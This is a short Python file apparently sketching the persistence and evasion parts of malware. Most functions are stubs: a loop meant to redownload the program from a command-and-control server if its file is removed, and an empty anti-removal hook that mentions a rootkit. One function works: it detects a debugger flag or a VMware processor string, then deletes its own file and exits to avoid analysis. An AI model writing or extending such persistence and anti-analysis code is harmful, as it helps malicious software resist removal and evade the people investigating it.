import os
import sys
import threading
import time

def self_heal():
    # Monitor own process, restart if killed
    while True:
        time.sleep(10)
        if not os.path.exists(sys.argv[0]):
            # Recreate or download
            pass  # Implement download from C2

def anti_removal():
    # Hook into system to prevent deletion
    pass  # Advanced, perhaps rootkit

def self_delete_if_detected():
    # Check for debugger, VM, etc.
    if os.getenv('DEBUG') or 'vmware' in open('/proc/cpuinfo').read().lower():
        os.remove(sys.argv[0])
        sys.exit()